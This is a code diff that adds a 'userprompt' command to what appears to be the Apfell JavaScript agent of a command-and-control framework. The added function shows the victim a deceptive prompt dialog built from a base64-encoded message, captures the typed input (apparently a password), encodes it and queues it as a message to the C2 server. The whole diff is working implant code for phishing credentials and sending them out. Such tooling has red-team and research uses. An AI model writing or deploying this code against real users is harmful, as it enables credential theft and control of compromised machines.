@@ -1,0 +1,20 @@
+userprompt = function() {
+    let txt = atob(data['data']);
+    let ans = [];
+    let pass = prompt(txt);
+    if (pass != null){
+        ans.push(pass);
+    } else {
+        ans.push('User cancelled');
+    }
+
+    const promptdata = btoa(unescape(encodeURIComponent((JSON.stringify(ans)))));
+    const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, promptdata);
+    let meta = {};
+    meta["metatype"] = 3;
+    meta["metadata"] = apfellMsg;
+    const metaenvelope = JSON.stringify(meta);
+    out.push(metaenvelope);
+};
+
+C2.commands[userprompt.name] = userprompt;
